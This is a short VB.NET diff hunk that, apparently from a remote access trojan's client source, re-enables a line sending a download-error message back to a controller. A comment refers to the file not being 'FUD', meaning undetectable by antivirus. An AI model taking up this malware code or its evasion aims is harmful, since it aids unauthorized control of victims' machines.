@@ -26,7 +26,7 @@
                 End Try
 
             Catch ex As Exception
-                ' C_TcpClient.Send("MSG" + C_Main.SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
+                C_Main.C.Send("MSG" + C_Main.SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
             End Try
         End Sub
     End Class
